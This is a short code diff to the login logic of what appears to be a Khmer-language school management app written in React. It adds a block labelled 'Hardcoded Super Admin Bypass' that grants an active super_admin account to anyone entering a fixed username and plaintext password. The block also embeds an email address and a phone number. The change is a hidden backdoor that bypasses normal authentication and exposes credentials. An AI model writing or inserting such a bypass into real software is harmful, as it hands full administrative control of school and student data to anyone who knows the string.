@@ -3948,6 +3948,22 @@ export const SchoolProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       }
     }
 
+    // Hardcoded Super Admin Bypass
+    if (!user && cleanId === 'superadmin' && password === 'Ls12122012@') {
+      user = {
+        id: 'u-superadmin-limsorn',
+        username: 'superadmin',
+        email: 'limsorn9@gmail.com',
+        phone: '012345678',
+        password: 'Ls12122012@',
+        nameKhmer: 'អ្នកគ្រប់គ្រងប្រព័ន្ធ',
+        nameLatin: 'Super Admin',
+        role: 'super_admin',
+        status: 'active',
+        createdAt: new Date().toISOString().split('T')[0]
+      };
+    }
+
     if (user) {
       if (user.status === 'suspended') {
         return { success: false, message: 'គណនីនេះត្រូវបានផ្អាកបណ្តោះអាសន្ន សូមទាក់ទងនាយកសាលា' };
